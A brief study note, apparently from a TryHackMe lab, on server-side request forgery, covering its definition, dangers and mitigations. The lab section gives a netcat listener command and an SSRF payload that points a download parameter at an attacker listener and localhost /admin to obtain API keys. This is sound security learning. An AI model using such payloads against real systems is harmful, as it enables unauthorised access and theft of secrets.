# Server-Side Request Forgery (SSRF)

## What is it?
- When a webapp can be tricked into making request on behalf of users to arbitary destinations while having control of the contents of requests itself then it's called SSRF.

## Why is it dangerous?
- Can be used to access internal services not exposed publicly.
- Steal sensitive data like API keys.
- Lead to remote code execution if internal services are vulnerable.

##  What I did in TryHackMe:
- Identified that accessing /admin was restricted to localhost.
- Found server=secure-file-storage.com parameter in a download URL.
- Set the netcat listener (nc -lvnp 4444)
- Intercepted the request, redirected it to my AttackBox listener using server=http://<my-ip>:4444/download?server=http://localhost:4444/admin%23&id=75482342
- Retrieve the API Keys and flag.

# Mitigation
- Whitelist allowed remote hosts.
- Sanitize input URLs.
- Enforce internal routing controls.
